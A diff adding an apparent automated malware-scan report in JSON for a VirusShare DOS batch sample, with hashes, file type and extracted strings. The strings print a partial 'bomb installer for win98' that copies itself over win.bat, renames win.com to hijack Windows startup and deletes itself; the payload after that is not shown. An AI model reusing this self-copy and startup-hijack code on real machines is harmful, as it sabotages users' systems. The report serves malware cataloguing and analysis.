@@ -1,0 +1,47 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "@echo off\ncls \nrem bomb installer for win98 caps\ntype %0 | find /V \"inst\" >c:\\inst.txt\ncopy c:\\inst.txt %windir%\\win.bat >nul\nrename %windir%\\win.com wind.com %inst% >nul\ndel %0 %inst% >nul\nif \"%0\"==\"%windir%\\WIN.BAT\" goto winrun\nif \"%0\"==\"win\" goto winrun\nif \"%0\"==\"WIN\" goto winrun\ngoto exi\n:winrun"
+    },
+    "filename": "VirusShare_3d06b1173bdfa4f8490d4aa05d7d5a41",
+    "filesize": 313,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3d06b1173bdfa4f8490d4aa05d7d5a41",
+        "sha1": "d1d2a30da676e775cb9f23709980075786a32af8",
+        "sha256": "3f37baf2816f89eeb70cbd03b476e688f61a36d7ac8d8c7e22ec12193e4d20b5"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "cls ",
+            "rem bomb installer for win98 caps",
+            "type %0 | find /V \"inst\" >c:\\inst.txt",
+            "copy c:\\inst.txt %windir%\\win.bat >nul",
+            "rename %windir%\\win.com wind.com %inst% >nul",
+            "del %0 %inst% >nul",
+            "if \"%0\"==\"%windir%\\WIN.BAT\" goto winrun",
+            "if \"%0\"==\"win\" goto winrun",
+            "if \"%0\"==\"WIN\" goto winrun",
+            "goto exi",
+            ":winrun"
+        ],
+        "file": {
+            "type %0 | find /V \"inst\" >c:\\inst.txt": "Text"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.247818",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
